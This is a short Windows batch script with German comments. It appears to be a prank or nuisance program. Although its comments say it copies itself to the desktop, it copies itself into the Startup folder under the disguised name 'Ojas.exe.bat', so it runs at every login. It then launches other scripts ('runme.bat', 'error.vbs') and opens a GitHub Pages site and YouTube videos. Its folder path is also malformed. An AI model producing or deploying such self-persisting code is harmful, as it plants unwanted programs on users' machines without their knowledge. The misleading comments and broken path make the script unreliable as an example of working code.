:: Pfad zum Desktop des aktuellen Benutzers herausfinden
set USERPROFILE=%USERPROFILE%
set Desktop=C:\Benutzer\%USERPROFILE%\AppData\Roaming\Microsoft\Windows\Start Menu\Programme\Startup

:: Das Batch-Skript auf den Desktop des Benutzers kopieren
copy "%~f0" "%Desktop%\Ojas.exe.bat"
start "runme.bat"
start "error.vbs"
start "https://binarybros24.github.io/"
start No Body cares
start "https://www.youtube.com/shorts/wTDsx42xhHg"
start "https://www.youtube.com/shorts/SXHMnicI6Pg"

